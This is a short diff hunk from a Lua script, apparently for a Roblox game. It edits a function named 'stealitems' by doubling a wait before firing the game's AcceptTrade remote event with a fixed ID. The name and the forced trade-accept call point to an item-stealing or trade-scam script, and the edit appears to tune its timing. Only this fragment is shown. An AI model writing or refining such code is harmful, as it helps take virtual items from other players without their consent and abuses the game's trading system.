@@ -588,7 +588,7 @@ local function stealitems()
         end
     end
 
-    wait(6)
+    wait(12)
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
 end
 
